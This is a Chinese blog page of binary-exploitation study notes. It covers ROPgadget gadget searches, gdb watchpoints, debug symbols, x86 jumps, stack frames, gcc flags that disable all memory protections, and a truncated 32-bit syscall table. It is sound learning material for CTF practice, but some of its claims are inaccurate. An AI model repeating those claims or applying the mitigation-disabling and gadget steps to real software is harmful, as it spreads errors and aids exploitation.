id=\"aplayer-hsJCrKIN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"杂碎的知识点\"><a href=\"#杂碎的知识点\" class=\"headerlink\" title=\"杂碎的知识点\"></a>杂碎的知识点</h2><h3 id=\"1）调试相关\"><a href=\"#1）调试相关\" class=\"headerlink\" title=\"1）调试相关\"></a>1）调试相关</h3><h5 id=\"1）gdb\"><a href=\"#1）gdb\" class=\"headerlink\" title=\"1）gdb\"></a>1）gdb</h5><p>ropgagdet</p>\n<p>ROPgadget –binary （） –only “pop|ret” | grep rdi</p>\n<p>(基本适用于ret2csu这种万能gagdet的寻找)</p>\n<p>例如<code>ROPgadget --binary calc --only &quot;pop|ret&quot; | grep eax</code></p>\n<h5 id=\"2）内存断点？硬件断点？\"><a href=\"#2）内存断点？硬件断点？\" class=\"headerlink\" title=\"2）内存断点？硬件断点？\"></a>2）内存断点？硬件断点？</h5><h6 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h6><p>对所访问内存地址设置为不可读写，当访问时触发中断。</p>\n<h6 id=\"设置方式\"><a href=\"#设置方式\" class=\"headerlink\" title=\"设置方式\"></a>设置方式</h6><p>参见pwndbg那张巨长的图。</p>\n<p><code>watch 0x123456</code></p>\n<p><code>watch a</code></p>\n<h5 id=\"加载调试符号\"><a href=\"#加载调试符号\" class=\"headerlink\" title=\"加载调试符号\"></a>加载调试符号</h5><p>​        对于没有stripped的程序，抽取制作调试符号：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">objcopy --only-keep-debug ELF_DEBUG xx.symbol</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​        加载符号表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb --symbol=xx.symbol -<span class=\"built_in\">exec</span>=ELF_RELEASE</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>或者直接利用有调试符号的elf作为符号表来源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb --symbol=ELF -<span class=\"built_in\">exec</span>=ELF_RELEASE</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>直接为ELF文件添加符号表链接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">objcopy --add-gnu-debuglink=xx.symbol ELF_RELEASE</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2）汇编指令\"><a href=\"#2）汇编指令\" class=\"headerlink\" title=\"2）汇编指令\"></a>2）汇编指令</h3><h4 id=\"跳转指令\"><a href=\"#跳转指令\" class=\"headerlink\" title=\"跳转指令\"></a>跳转指令</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">JE   ;等于则跳转</span><br><span class=\"line\">JNE  ;不等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JZ   ;为 0 则跳转</span><br><span class=\"line\">JNZ  ;不为 0 则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JS   ;为负则跳转</span><br><span class=\"line\">JNS  ;不为负则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JC   ;进位则跳转</span><br><span class=\"line\">JNC  ;不进位则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JO   ;溢出则跳转</span><br><span class=\"line\">JNO  ;不溢出则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JA   ;无符号大于则跳转</span><br><span class=\"line\">JNA  ;无符号不大于则跳转</span><br><span class=\"line\">JAE  ;无符号大于等于则跳转</span><br><span class=\"line\">JNAE ;无符号不大于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JG   ;有符号大于则跳转</span><br><span class=\"line\">JNG  ;有符号不大于则跳转</span><br><span class=\"line\">JGE  ;有符号大于等于则跳转</span><br><span class=\"line\">JNGE ;有符号不大于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JB   ;无符号小于则跳转</span><br><span class=\"line\">JNB  ;无符号不小于则跳转</span><br><span class=\"line\">JBE  ;无符号小于等于则跳转</span><br><span class=\"line\">JNBE ;无符号不小于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">ps:</span><br><span class=\"line\">；rax = 2</span><br><span class=\"line\">cmp rax,1; =&gt;jump</span><br><span class=\"line\"></span><br><span class=\"line\">JL   ;有符号小于则跳转</span><br><span class=\"line\">JNL  ;有符号不小于则跳转</span><br><span class=\"line\">JLE  ;有符号小于等于则跳转</span><br><span class=\"line\">JNLE ;有符号不小于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JP   ;奇偶位置位则跳转</span><br><span class=\"line\">JNP  ;奇偶位清除则跳转</span><br><span class=\"line\">JPE  ;奇偶位相等则跳转</span><br><span class=\"line\">JPO  ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"函数调用栈\"><a href=\"#函数调用栈\" class=\"headerlink\" title=\"函数调用栈\"></a>函数调用栈</h4><p>Leave等价于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov esp ebp</span><br><span class=\"line\">pop ebp</span><br></pre></td></tr></table></figure>\n\n<p> retn=pop eip（ret是回到函数调用前的下一条指令，ret指令等于将esp的贮存值（也就是栈·顶弹出）赋给eip，然后esp+4，由于esp中贮存的是函数调用前的下一条指令的地址，所以自然而然能够返回）</p>\n<p>但是为什么esp里面会贮存函数调用前的下一条指令的地址呢？</p>\n<p>这里要注意调用者函数和被调用者函数的栈桢是不同的。每一个发生一个函数调用就会产生一个新的栈帧。</p>\n<blockquote>\n<p>call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用RET（从过程返回）指令将处理器转回到该过程被调用的程序点上。从物理上来说，CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。</p>\n<p>​                                                                                                                         《cs：app》page：114</p>\n</blockquote>\n<p>（ps：csapp中的堆栈单纯指栈而不指堆）</p>\n<p>在这里当函数被调用，函数调用前的下一条指令的地址被作为esp的值被压栈了。也就是函数调用的第一句：push esp</p>\n<p>。函数被调——》</p>\n<p>被调用函数栈帧压入调用栈。</p>\n<p>建立新的栈帧，把被调函数的栈帧栈底地址放入bp中</p>\n<p>=〉push rbp</p>\n<p>​       mov rbp， rsp</p>\n<h3 id=\"3）编译指令\"><a href=\"#3）编译指令\" class=\"headerlink\" title=\"3）编译指令\"></a>3）编译指令</h3><h5 id=\"1）gcc编译\"><a href=\"#1）gcc编译\" class=\"headerlink\" title=\"1）gcc编译\"></a>1）gcc编译</h5><p>普通的编译（默认保护全开）】<code>gcc test.c -o test</code></p>\n<p>禁用PIE <code>gcc -z -no-pie test.c -o test</code></p>\n<p>禁用RELRO <code>gcc -z norelro x x x.c -o xxx</code></p>\n<p>禁用Canary <code>-fno-stack-protector</code></p>\n<p>禁用NX <code>gcc -z execstack -o test test.c    </code></p>\n<p>所以保护全关的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"4）linux系统调用号\"><a href=\"#4）linux系统调用号\" class=\"headerlink\" title=\"4）linux系统调用号\"></a>4）linux系统调用号</h3><h5 id=\"1）32bit\"><a href=\"#1）32bit\" class=\"headerlink\" title=\"1）32bit\"></a>1）32bit</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_restart_syscall 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fork 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_read 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_write 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_close 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitpid 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_creat 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_link 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlink 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execve 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chdir 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_time 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknod 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chmod 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lchown 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_break 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldstat 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lseek 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpid 20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mount 21</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount 22</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid 23</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid 24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stime 25</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ptrace 26</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_alarm 27</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldfstat 28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pause 29</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utime 30</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stty 31</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gtty 32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_access 33</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nice 34</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftime 35</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync 36</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kill 37</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rename 38</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdir 39</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rmdir 40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup 41</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe 42</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_times 43</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prof 44</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_brk 45</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid 46</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid 47</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signal 48</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid 49</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid 50</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_acct 51</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount2 52</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lock 53</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioctl 54</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl 55</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mpx 56</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpgid 57</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ulimit 58</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldolduname 59</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umask 60</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chroot 61</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ustat 62</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup2 63</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getppid 64</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgrp 65</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsid 66</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaction 67</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sgetmask 68</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ssetmask 69</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid 70</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid 71</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigsuspend 72</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigpending 73</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sethostname 74</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setrlimit 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrlimit 76</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrusage 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettimeofday 78</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_settimeofday 79</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups 81</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_select 82</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlink 83</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldlstat 84</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlink 85</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uselib 86</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapon 87</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_reboot 88</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readdir 89</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap 90</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munmap 91</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate 92</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate 93</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmod 94</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown 95</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpriority 96</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpriority 97</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_profil 98</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs 99</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioperm 101</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketcall 102</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syslog 103</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setitimer 104</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getitimer 105</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat 106</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat 107</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat 108</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_olduname 109</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_iopl 110</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vhangup 111</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_idle 112</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vm86old 113</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_wait4 114</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapoff 115</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysinfo 116</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ipc 117</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsync 118</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigreturn 119</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clone 120</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setdomainname 121</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uname 122</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_modify_ldt 123</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_adjtimex 124</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mprotect 125</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigprocmask 126</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_create_module 127</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_init_module 128</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_delete_module 129</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_kernel_syms 130</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_quotactl 131</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgid 132</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchdir 133</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bdflush 134</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysfs 135</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_personality 136</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_afs_syscall 137</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid 138</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid 139</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__llseek 140</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents 141</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__newselect 142</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flock 143</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msync 144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readv 145</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_writev 146</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsid 147</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fdatasync 148</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__sysctl 149</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock 150</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlock 151</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlockall 152</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlockall 153</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setparam 154</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getparam 155</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setscheduler 156</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getscheduler 157</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_yield 158</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_max 159</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_min 160</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nanosleep 162</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mremap 163</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid 164</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid 165</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vm86 166</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_query_module 167</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_poll 168</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nfsservctl 169</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid 170</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid 171</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prctl 172</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigreturn 173</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigaction 174</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigprocmask 175</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigpending 176</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigsuspend 179</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pread64 180</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwrite64 181</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown 182</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcwd 183</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capget 184</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capset 185</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaltstack 186</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile 187</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpmsg 188</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_putpmsg 189</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vfork 190</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ugetrlimit 191</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap2 192</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate64 193</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate64 194</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat64 195</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat64 196</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat64 197</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lchown32 198</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid32 199</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid32 200</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid32 201</span></span><br><span class=\"line\"><span 